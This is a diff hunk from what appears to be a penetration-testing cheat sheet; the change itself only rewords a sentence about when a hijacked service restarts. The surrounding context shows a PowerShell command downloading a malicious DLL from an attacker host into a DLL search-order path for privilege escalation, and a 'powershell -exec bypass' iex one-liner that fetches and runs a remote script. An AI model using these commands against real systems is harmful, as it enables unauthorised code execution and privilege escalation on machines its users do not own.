@@ -308,7 +308,7 @@ Download to target machine:
 ```powershell
 iwr -uri http://$(ATTACKER_IP)/$NAME_OF_VULNERABLE.dll -OutFile 'C:\Path\to\higher\dll\search\order\$NAME_OF_VULNERABLE.dll'
 ```
-Once the service that uses the vulnerable DLL is started or restarted by someone of higher privileges (if the service is on autorun on boot, then the target could just be restarted), then the malicious DLL will be run.
+Once the service that uses the vulnerable DLL is started or restarted by someone of higher privileges (if the service startup type is automatic, the system can be rebooted), then the malicious DLL will be run.
 # Winpeas
 ```powershell
 powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$IP_ADDRESS/winpeas.ps1'))"
